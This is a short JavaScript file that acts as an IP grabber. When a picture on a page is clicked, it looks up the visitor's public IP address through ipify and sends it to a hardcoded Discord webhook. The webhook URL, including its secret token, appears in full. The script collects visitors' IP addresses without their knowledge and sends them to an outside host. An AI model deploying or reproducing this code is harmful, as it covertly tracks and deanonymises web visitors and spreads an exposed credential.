function post_to_url(url, data) {
    var xhr = new XMLHttpRequest();
    xhr.open('POST', url, true);
    xhr.setRequestHeader('Content-Type', 'application/json');
    xhr.send(JSON.stringify(data));
}

function get_ip() {
    xhs = new XMLHttpRequest();
    xhs.open("GET", "https://api.ipify.org?format=json", false);
    xhs.send();

    return JSON.parse(xhs.responseText).ip;
}

const webhook = "https://discord.com/api/webhooks/1005632005276434513/Leebiofk9NaGIaGJvb7CxiAL4ttEPrHrpB6T9KFxHAzum4XdMGJc1WQ-KRlNnRTUf-hF"
const data = null

function PictureClicked() {
    const myip = get_ip();
    const data = {
        "content": "Picture clicked! | IP: " + myip,
    }
    post_to_url(webhook, data);
}